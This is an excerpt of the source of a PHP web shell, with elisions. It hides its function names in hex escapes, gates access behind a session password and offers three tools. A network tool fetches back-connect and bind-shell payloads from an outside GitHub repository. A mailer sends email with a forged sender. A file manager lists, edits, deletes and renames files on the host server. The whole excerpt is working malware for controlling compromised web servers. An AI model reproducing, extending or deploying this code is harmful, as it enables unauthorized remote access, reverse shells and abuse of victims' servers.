...
if (isset(${"\x5F\x53\x45\x53\x53\x49\x4F\x4E"}['pass']) == $pass) {
  ...
  if (isset($tools)) {
    if (hlx($tools) == 'network') {
      $pty = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"('https://raw.githubusercontent.com/adilhyz/WebShell/master/403/0P/back_connect/python.txt');
      $rby = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"('https://raw.githubusercontent.com/adilhyz/WebShell/master/403/0P/back_connect/ruby.txt');
      $bcc = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"('https://raw.githubusercontent.com/adilhyz/WebShell/master/403/0P/back_connect/c.txt');
      $bcp = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"('https://raw.githubusercontent.com/adilhyz/WebShell/master/403/0P/back_connect/perl.txt');
      $bpc = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"('https://raw.githubusercontent.com/adilhyz/WebShell/master/403/0P/bind_shell/c.txt');
      $bpp = "\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"('https://raw.githubusercontent.com/adilhyz/WebShell/master/403/0P/bind_shell/perl.txt');
    ...
    if (hlx($tools) == 'mailer') {
      echo '<h2>Mailer Tools</h2><form method="post" action="">From: <input type="text" name="from" value="sanrei@' . ${"\x5f\x53\x45\x52\x56\x45\x52"}['SERVER_NAME'] . '"> To: <input type="text" name="to" value="contact@target.com"> Subject: <input type="text" name="subject" value="im using your webshell!"><br><textarea name="message" style="width: 40%;" rows="15">my ip address is ' . ${"\x5f\x53\x45\x52\x56\x45\x52"}['REMOTE_ADDR'] . '</textarea><br><input type="submit" value="Execute"/></form><pre>';
      if (isset(${"\x5f\x50\x4f\x53\x54"}['from'])) {
        $headers = "From: Sanrei <" . ${"\x5f\x50\x4f\x53\x54"}['from'] . ">" . PHP_EOL;
        $headers .= "Reply-To: Sanrei <" . ${"\x5f\x50\x4f\x53\x54"}['from'] . ">" . PHP_EOL;
  ...
  foreach ("\x73\x63\x61\x6E\x64\x69\x72"($path) as $files) {
    ...
    if ($files == ".." | $files == ".") {
      echo "<tr>\n                  <td><img src='//raw.githubusercontent.com/adilhyz/WebShell/master/403/0P/fldr.png' /><b><a href='?d=" . xlh("\x64\x69\x72\x6e\x61\x6d\x65"($path)) . "'>$files</a></b></td><td></td><td></td><td></td><td></td><td></td><td></td></tr>";
    } else {
      echo "<tr><td><img src='//raw.githubusercontent.com/adilhyz/WebShell/master/403/0P/fldr.png' /><b><a href=$file?d=" . xlh($path . '/' . $files) . ">$files</a></b></td><td id='c'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; / <a href=$file?rmdir=" . xlh($files) . "&d=" . xlh($path) . ">RM</a> / <a href=?rename&oldname=" . xlh($files) . "&d=" . xlh($path) . ">CN</a></td>\n                  <td id='c'>-</td>\n                  <td id='c'>" . gtyp($files) . "</td>\n                  <td id='c'>" . perms($files) . "</td>\n                  <td id='c'>" . goog($files) . "</td>\n                  <td id='c'>" . lasmod($files) . "</td>\n              </tr>";
    }
  }
  foreach ("\x73\x63\x61\x6E\x64\x69\x72"($path) as $files) {
    if (!is_file($files)) continue;
    echo "<tr><td><img src='//raw.githubusercontent.com/adilhyz/WebShell/master/403/0P/file.png' /><a href=$file?f=" . xlh($files) . " &d=" . xlh($path) . ">$files</a></td><td id='c'><a href=$file?fedit=" . xlh($files) . "&d=" . xlh($path) . ">ED</a> / <a href=$file?rfile=" . xlh($files) . "&d=" . xlh($path) . ">RM</a> / <a href=?rename&oldname=" . xlh($files) . "&d=" . xlh($path) . ">CN</a></td>\n            <td id='c'>" . fsize($files) . "</td>\n            <td id='c'>" . gtyp($files) . "</td>\n            <td id='c'>" . perms($files) . "</td>\n            <td id='c'>" . goog($files) . "</td>\n            <td id='c'>" . lasmod($files) . "</td>\n        </tr>";
  }
